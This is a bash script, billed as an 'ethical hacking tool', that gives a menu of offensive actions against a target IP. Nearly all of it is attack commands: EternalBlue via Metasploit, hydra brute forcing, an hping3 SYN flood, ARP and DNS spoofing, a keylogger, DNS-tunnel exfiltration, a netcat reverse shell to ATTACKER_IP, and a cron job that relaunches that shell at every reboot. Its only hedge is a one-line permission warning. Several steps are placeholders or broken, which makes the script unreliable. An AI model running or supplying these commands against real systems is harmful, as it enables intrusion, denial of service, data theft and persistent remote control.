#!/bin/bash

# Ultimate Ethical Hacking Tool - Final Version
# A comprehensive tool for ethical hacking professionals.
# WARNING: Use responsibly and legally with explicit written permission.

# User-configurable variables
ATTACKER_IP="YOUR_ATTACKER_IP"  # Your attacker's IP (for reverse shell, etc.)
TARGET=$1
LOG_FILE=$2
NETWORK_INTERFACE="eth0"  # Adjust for your network interface (eth0, wlan0, etc.)

# Ensure valid input
if [ -z "$TARGET" ] || [ -z "$LOG_FILE" ]; then
    echo "Usage: $0 <target_ip> <log_file>"
    exit 1
fi

# Helper function for logging
log_message() {
    echo "$1" | tee -a $LOG_FILE
}

# Information Gathering - Whois, DNS, etc.
info_gathering() {
    log_message "Gathering information for $TARGET..."
    whois $TARGET | tee -a $LOG_FILE
    nslookup $TARGET | tee -a $LOG_FILE
    curl -I http://$TARGET | tee -a $LOG_FILE
    curl -I https://$TARGET | tee -a $LOG_FILE
}

# Nmap Port Scanning & OS Detection
nmap_scan() {
    log_message "Running Nmap scan on $TARGET..."
    nmap -sS -sV -O -T4 $TARGET -oN nmap_scan_results.txt | tee -a $LOG_FILE
}

# Web Application Vulnerability Scanning
web_vuln_scan() {
    log_message "Running web vulnerability scan on $TARGET..."
    nikto -h http://$TARGET -output nikto_results.txt | tee -a $LOG_FILE
    wapiti -u http://$TARGET -o wapiti_results.txt | tee -a $LOG_FILE
}

# Brute Force Attacks (SSH, FTP, HTTP)
brute_force() {
    log_message "Brute forcing SSH, FTP, and HTTP on $TARGET..."
    hydra -l admin -P /path/to/wordlist.txt ssh://$TARGET | tee -a $LOG_FILE
    hydra -l admin -P /path/to/wordlist.txt ftp://$TARGET | tee -a $LOG_FILE
    hydra -l admin -P /path/to/wordlist.txt http-get://$TARGET | tee -a $LOG_FILE
}

# Metasploit Exploits (Reverse Shells, EternalBlue)
metasploit_exploit() {
    log_message "Running Metasploit Exploit on $TARGET..."
    msfconsole -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS $TARGET; set LHOST $ATTACKER_IP; exploit" | tee -a $LOG_FILE
}

# Phishing Attack (Fake Login Pages)
phishing_attack() {
    log_message "Launching Phishing Attack..."
    cd /path/to/phishing_tool
    python3 phishing_tool.py -t $TARGET -o phishing_results.txt | tee -a $LOG_FILE
}

# Denial of Service (DoS)
dos_attack() {
    log_message "Launching DoS Attack on $TARGET..."
    hping3 --flood -S -p 80 $TARGET | tee -a $LOG_FILE
}

# Man-in-the-Middle (MITM) Attack (ARP Spoofing)
mitm_attack() {
    log_message "Performing MITM Attack on $TARGET..."
    ettercap -T -q -i $NETWORK_INTERFACE -M arp:remote /$TARGET// | tee -a $LOG_FILE
}

# Traffic Sniffing (Wireshark/Tcpdump)
traffic_sniff() {
    log_message "Sniffing Traffic on $TARGET..."
    tcpdump -i $NETWORK_INTERFACE host $TARGET -w traffic.pcap | tee -a $LOG_FILE
}

# Keylogging (Python or C-based Keyloggers)
keylogger() {
    log_message "Starting Keylogger on $TARGET..."
    mkdir /tmp/keylogger
    cd /tmp/keylogger
    git clone https://github.com/your-keylogger-repo.git
    cd keylogger-repo
    python3 keylogger.py -t $TARGET | tee -a $LOG_FILE
}

# Wi-Fi Cracking (WPA/WPA2)
wifi_crack() {
    log_message "Cracking Wi-Fi password on $TARGET..."
    aircrack-ng -w /path/to/wordlist.txt -b $TARGET /path/to/capture.cap | tee -a $LOG_FILE
}

# Local Privilege Escalation (LinPEAS)
privilege_escalation() {
    log_message "Attempting Local Privilege Escalation on $TARGET..."
    sudo -l | tee -a $LOG_FILE
    linpeas | tee -a $LOG_FILE
}

# Reverse Shell (Netcat)
reverse_shell() {
    log_message "Setting up Reverse Shell on $TARGET..."
    nc -e /bin/bash $ATTACKER_IP 1234 &>/dev/null &
    echo "Reverse shell initiated." | tee -a $LOG_FILE
}

# Persistence Setup (Cron Jobs, Reverse Shells)
persistence() {
    log_message "Setting up Persistence on $TARGET..."
    echo "@reboot nc -e /bin/bash $ATTACKER_IP 1234" | crontab - | tee -a $LOG_FILE
    echo "Persistence set up." | tee -a $LOG_FILE
}

# DNS Spoofing (MITM)
dns_spoof() {
    log_message "Starting DNS Spoofing Attack on $TARGET..."
    ettercap -T -q -i $NETWORK_INTERFACE -M arp:remote /$TARGET// /$TARGET// | tee -a $LOG_FILE
}

# Data Exfiltration via DNS Tunneling
data_exfiltration() {
    log_message "Exfiltrating Data via DNS Tunneling..."
    dns2tcp -H $TARGET -P 53 -C configfile.conf | tee -a $LOG_FILE
}

# Create Final Package Archive
package_tool() {
    log_message "Packaging tool for production deployment..."
    tar -czf ultimate_hacking_tool.tar.gz /path/to/your/tool/ | tee -a $LOG_FILE
    echo "Tool packaged and ready for deployment." | tee -a $LOG_FILE
}

# Display Menu for User Interaction
display_menu() {
    clear
    echo "===================================="
    echo " Ultimate Ethical Hacking Tool"
    echo "===================================="
    echo "1. Information Gathering"
    echo "2. Nmap Scan"
    echo "3. Web Vulnerability Scan"
    echo "4. Brute Force Attacks"
    echo "5. Metasploit Exploits"
    echo "6. Phishing Attack"
    echo "7. DoS Attack"
    echo "8. MITM Attack"
    echo "9. Traffic Sniffing"
    echo "10. Keylogger"
    echo "11. Wi-Fi Cracking"
    echo "12. Privilege Escalation"
    echo "13. Reverse Shell"
    echo "14. Persistence Setup"
    echo "15. DNS Spoofing"
    echo "16. Data Exfiltration"
    echo "17. Final Package (Deploy)"
    echo "18. Exit"
    echo -n "Choose an option (1-18): "
}

# Main Driver for User Input
read_action() {
    while true; do
        display_menu
        read -p "Enter your choice: " ACTION
        case $ACTION in
            1) info_gathering ;;
            2) nmap_scan ;;
            3) web_vuln_scan ;;
            4) brute_force ;;
            5) metasploit_exploit ;;
            6) phishing_attack ;;
            7) dos_attack ;;
            8) mitm_attack ;;
            9) traffic_sniff ;;
            10) keylogger ;;
            11) wifi_crack ;;
            12) privilege_escalation ;;
            13) reverse_shell ;;
            14) persistence ;;
            15) dns_spoof ;;
            16) data_exfiltration ;;
            17) package_tool ;;
            18) exit 0 ;;
            *) echo "Invalid choice, please try again." ;;
        esac
    done
}

# Run Tool
read_action
